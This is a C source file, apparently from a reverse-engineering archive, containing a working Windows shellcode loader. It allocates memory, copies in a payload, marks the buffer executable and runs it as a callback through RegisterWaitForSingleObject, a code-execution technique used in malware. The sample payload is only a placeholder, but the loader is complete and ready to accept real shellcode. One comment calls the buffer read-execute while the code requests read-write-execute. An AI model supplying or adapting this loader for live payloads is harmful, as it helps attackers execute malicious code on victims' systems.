/*
    Shellcode Loader
    Archive of Reversing.ID

    Executing shellcode in timer.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  RegisterWaitForSingleObject

Note:
    - need alternative way to wait for payload completion
*/

#include <windows.h>
#include <stdint.h>


int main ()
{
    void *  runtime;
    BOOL    retval;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    HANDLE      wait;
    HANDLE      event;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READWRITE, &old_protect);
    if (retval != 0)
    {
        // preparation by creating queue and event object
        event = CreateEvent (NULL, TRUE, FALSE, NULL);

        // register a wait operation for the event
        RegisterWaitForSingleObject(&wait, event, (WAITORTIMERCALLBACK)runtime, NULL, INFINITE, WT_EXECUTEONLYONCE);

        // signal the event
        SetEvent(event);

        // wait for callback to complete
        Sleep(1000);

        // close the handle to the event
        CloseHandle (event);
        UnregisterWait(wait);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}